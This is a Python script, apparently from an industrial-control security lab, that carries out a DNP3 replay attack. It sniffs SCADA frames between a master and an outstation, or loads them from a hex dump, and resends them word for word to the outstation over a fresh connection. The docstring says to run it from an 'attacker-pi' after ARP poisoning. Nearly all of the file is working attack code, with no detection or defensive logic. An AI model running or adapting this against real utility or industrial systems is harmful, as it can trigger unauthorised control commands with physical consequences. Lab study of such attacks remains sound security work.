"""REPLAY — capture legitimate DNP3 from the master, then replay it.

Phase 1: sniff TCP/20000 between master and outstation, store payloads.
Phase 2: open a fresh TCP connection to the outstation and resend the
         captured DNP3 application frames verbatim.

Run on attacker-pi after ARP-poisoning, or just on a tap. Or use
--from-file to replay a pre-recorded hex dump.
"""
import argparse, socket, sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from scapy.all import sniff, TCP, Raw
from dnp3 import now
from config import OUTSTATION_IP, OUTSTATION_PORT, ATTACKER_IFACE

def capture(iface, host, port, n):
    print(f"[{now()}] REPLAY capture: sniffing {n} pkts on {iface}")
    pkts = sniff(iface=iface, count=n,
                 filter=f"tcp and host {host} and port {port}",
                 lfilter=lambda p: TCP in p and Raw in p and bytes(p[Raw])[:2] == b"\x05\x64")
    return [bytes(p[Raw]) for p in pkts]

def replay(host, port, payloads, interval):
    print(f"[{now()}] REPLAY send: {len(payloads)} frames -> {host}:{port}")
    with socket.create_connection((host, port), timeout=5) as s:
        for pl in payloads:
            s.sendall(pl)
            try: s.recv(4096)
            except socket.timeout: pass
            time.sleep(interval)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--iface", default=ATTACKER_IFACE)
    p.add_argument("--host", default=OUTSTATION_IP)
    p.add_argument("--port", type=int, default=OUTSTATION_PORT)
    p.add_argument("--capture-count", type=int, default=20)
    p.add_argument("--interval", type=float, default=0.5)
    p.add_argument("--from-file", help="hex-per-line file of pre-captured DNP3 frames")
    a = p.parse_args()

    if a.from_file:
        with open(a.from_file) as f:
            payloads = [bytes.fromhex(l.strip()) for l in f if l.strip()]
    else:
        payloads = capture(a.iface, a.host, a.port, a.capture_count)
    if not payloads:
        print("no payloads captured"); return
    replay(a.host, a.port, payloads, a.interval)
    print(f"[{now()}] REPLAY stop")

if __name__ == "__main__":
    main()
